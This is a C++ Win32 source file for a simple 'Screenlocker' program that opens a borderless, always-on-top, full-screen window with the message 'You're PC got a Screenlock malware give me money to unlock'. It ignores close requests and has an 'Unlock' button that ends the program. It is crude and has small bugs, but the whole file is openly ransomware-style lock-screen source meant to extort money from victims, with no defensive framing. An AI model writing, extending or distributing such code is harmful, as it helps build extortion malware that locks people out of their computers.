#include "ScreenLocker.h"

int WINAPI WinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPSTR     lpCmdLine,
	_In_ int       nCmdShow)
{
	auto className = const_cast<LPSTR>("Screenlocker");
	WNDCLASSEXA window;
	window.cbSize = sizeof(WNDCLASSEX);
	window.style = 0;
	window.lpfnWndProc = WindowProc;
	window.cbClsExtra = 0;
	window.cbWndExtra = 0;
	window.hInstance = hInstance;
	window.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
	window.hCursor = LoadCursor(nullptr, IDC_ARROW);
	window.hbrBackground = (HBRUSH)(COLOR_WINDOW);
	window.lpszMenuName = nullptr;
	window.lpszClassName = className;
	window.hIconSm = LoadIcon(nullptr, IDI_APPLICATION);

	if (!RegisterClassExA(&window))
	{
		MessageBoxA(nullptr, "Failed registering main window!", "Error", MB_OK | MB_ICONSTOP | MB_SYSTEMMODAL);
		return 1;
	}

	hWnd = CreateWindowExA(WS_EX_WINDOWEDGE | WS_EX_TOPMOST, className, className, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_MAXIMIZEBOX, 0, 0,
		GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), nullptr, nullptr, hInstance, nullptr);
	if (hWnd == nullptr)
	{
		MessageBoxA(nullptr, "Failed creating main window!", "Error", MB_OK | MB_ICONSTOP | MB_SYSTEMMODAL);
		return 2;
	}

	SetWindowLong(hWnd, GWL_STYLE, 0);

	auto hNormalFont = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
	hFont = CreateFontW(100, 100, 100, 100, FW_DONTCARE, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
		DEFAULT_PITCH | FF_SWISS, L"Arial");

	hTitle = CreateWindowExA(0, "STATIC", "Screenlocker", WS_CHILD | WS_VISIBLE, 900, 0, GetSystemMetrics(SM_CXSCREEN),
		120, hWnd, nullptr, nullptr, nullptr);
	SendMessageW(hTitle, WM_SETFONT, WPARAM(hNormalFont), TRUE);

	hTitle = CreateWindowExA(0, "STATIC", "You're PC got a Screenlock malware give me money to unlock", WS_CHILD | WS_VISIBLE, 800, 300,
		GetSystemMetrics(SM_CXSCREEN),
		120, hWnd, nullptr, nullptr, nullptr);
	SendMessageW(hDescription, WM_SETFONT, WPARAM(hNormalFont), TRUE);

	hButtonOK = CreateWindowExW(0, L"Button", L"Unlock", WS_CHILD | WS_VISIBLE, GetSystemMetrics(SM_CXSCREEN) - 1000, GetSystemMetrics(SM_CYSCREEN) - 550, 100, 50, hWnd, (HMENU)BUTTON, nullptr, nullptr);
	SendMessageA(hButtonOK, WM_SETFONT, (WPARAM)hNormalFont, TRUE);


	ShowWindow(hWnd, nCmdShow);
	UpdateWindow(hWnd);

	while (GetMessageA(&message, nullptr, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessageA(&message);
	}
	return message.wParam;

}

LRESULT CALLBACK WindowProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg)
	{
	case WM_COMMAND:
		switch (wParam)
		{
		case BUTTON:
			PostQuitMessage(0);
		}
	case WM_CLOSE:
		return 0;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProcA(hWnd, msg, wParam, lParam);
	}
	return DefWindowProcA(hWnd, msg, wParam, lParam);
}
